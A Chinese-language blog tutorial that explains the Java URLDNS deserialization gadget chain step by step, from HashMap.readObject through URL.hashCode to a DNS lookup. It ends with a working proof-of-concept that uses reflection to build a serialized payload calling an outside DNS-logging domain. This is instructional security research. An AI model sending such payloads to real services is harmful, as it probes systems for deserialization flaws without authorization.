# URLDNS链详解


&lt;
!--more--&gt;


先来看一下如何序列化/反序列化
```java
package org.example;  
  
import java.io.*;  
  
public class App   
{  
    public static void main( String[] args ) throws Exception  
    {  
        user user = new user();  
        user.setName(&#34;xiaoming&#34;);  
        //序列化输出  
        ObjectOutputStream out = new ObjectOutputStream(System.out);  
        out.writeObject(user);  
        System.out.println();  
        // 序列化写入文件  
        FileOutputStream file = new FileOutputStream(&#34;test.bin&#34;);  
        ObjectOutputStream fout = new ObjectOutputStream(file);  
        fout.writeObject(user);  
        // 序列化写入到变量中  
        ByteArrayOutputStream bout = new ByteArrayOutputStream();  
        ObjectOutputStream jout = new ObjectOutputStream(bout);  
        jout.writeObject(user);  
        byte[] str = bout.toByteArray();  
        System.out.println(new String(str));  
        // 从变量中反序列化  
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str));  
        user user_d = (user) ois.readObject();  
        System.out.println(user_d.getName());  
    }  
}  
  
class user implements Serializable{  
    private String name;  
  
    public user() {  
    }  
  
    public void setName(String name) {  
        this.name = name;  
    }  
  
    public String getName() {  
        return name;  
    }  
}
```
# URLDNS链详解
## 原理
`java.util.HashMap`重写了`readObject`方法，在反序列化时调用`hash`函数计算 key 的 hashCode，而`java.net.URL`的 hashCode 在计算时会调用`getHostAddress`来解析域名，从而发出 DNS 请求
由HashMap 类`readObject`引起，
```java
private void readObject(ObjectInputStream s)  
    throws IOException, ClassNotFoundException {  
    reinitialize();  
  
    ObjectInputStream.GetField fields = s.readFields();  
  
    // Read loadFactor (ignore threshold)  
    float lf = fields.get(&#34;loadFactor&#34;, 0.75f);  
    if (lf &lt;= 0 || Float.isNaN(lf))  
        throw new InvalidObjectException(&#34;Illegal load factor: &#34; &#43; lf);  
  
    lf = Math.min(Math.max(0.25f, lf), 4.0f);  
    HashMap.UnsafeHolder.putLoadFactor(this, lf);  
  
    s.readInt();                // Read and ignore number of buckets  
    int mappings = s.readInt(); // Read number of mappings (size)  
    if (mappings &lt; 0) {  
        throw new InvalidObjectException(&#34;Illegal mappings count: &#34; &#43; mappings);  
    } else if (mappings == 0) {  
        // use defaults  
    } else if (mappings &gt; 0) {  
        float fc = (float)mappings / lf &#43; 1.0f;  
        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?  
                   DEFAULT_INITIAL_CAPACITY :  
                   (fc &gt;= MAXIMUM_CAPACITY) ?  
                   MAXIMUM_CAPACITY :  
                   tableSizeFor((int)fc));  
        float ft = (float)cap * lf;  
        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?  
                     (int)ft : Integer.MAX_VALUE);  
  
        // Check Map.Entry[].class since it&#39;s the nearest public type to  
        // what we&#39;re actually creating.        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);  
        @SuppressWarnings({&#34;rawtypes&#34;,&#34;unchecked&#34;})  
        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];  
        table = tab;  
  
        // Read the keys and values, and put the mappings in the HashMap  
        for (int i = 0; i &lt; mappings; i&#43;&#43;) {  
            @SuppressWarnings(&#34;unchecked&#34;)  
                K key = (K) s.readObject();  
            @SuppressWarnings(&#34;unchecked&#34;)  
                V value = (V) s.readObject();  
            putVal(hash(key), key, value, false, false);  
        }  
    }  
}
```
在`HashMap`的键名计算了 hash，
`putVal(hash(key), key, value, false, false);`
跟进查看一下

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141127560.png)

调用了`key.hashCode()`，而这里的 key 是可控的，就是传入的`java.net.URL`，跟进查看一下

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141150723.png)

这里`hashCode==-1`，重新进行`hashCode()`方法计算，跟进`handler`查看调用了哪一个`hashCode()`

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141151442.png)

`transient关键字，修饰 Java 序列化对象时，不需要序列化属性`也就是`handler`属性不参与序列化，直接跟进`URLStreamHandler`查看一下

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141152682.png)

这里调用了`getHostAddress`跟进查看一下

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141153663.png)

又调用了`java.net.URL`的`getHostAddress`方法
继续跟进

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141154024.png)

进入到`InetAddress.getByName(host);`便会触发`DNS`请求
继续回到`readObject()`中，看看如何给`key`赋值

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141230086.png)

`key`是从`K key = (K) s.readObject();`这串代码，也就是`readObject`中得到的，说明之前是`writeObject`会写入 key
HashMap#writeObject

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232544.png)

进入了`internalWriteEntries()`跟进查看

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141232079.png)

这里的`key`以及`value`是从 tab 中取的，而 tab 的值即`HashMap`中 table 的值。
想要修改table的值，就需要调用`HashMap#put`方法，而HashMap#put方法中也会对key调用一次hash方法，所以这里也会产生一次dns查询
为了避免这次 dns 查询，我们将hashCode设置不为`-1`的其他值
构造完整poc
```java
package org.example;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.net.URL;  
import java.util.HashMap;  
  
  
public class URLDNS {  
    public static void main(String[] args) throws Exception {  
        HashMap hashmap = new HashMap();  
        URL url = new URL(&#34;http://47894df839.ipv6.1433.eu.org&#34;);  
        Field f = Class.forName(&#34;java.net.URL&#34;).getDeclaredField(&#34;hashCode&#34;);  
        f.setAccessible(true);  
        f.set(url,1);  
        hashmap.put(url,1);  
        f.set(url,-1);  
        ByteArrayOutputStream b = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(b);  
        oos.writeObject(hashmap);  
  
        byte[] str = b.toByteArray();  
        System.out.println(str);  
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str));  
        ois.readObject();  
  
  
    }  
}
```
调用栈如下

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401141314961.png)



---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/  

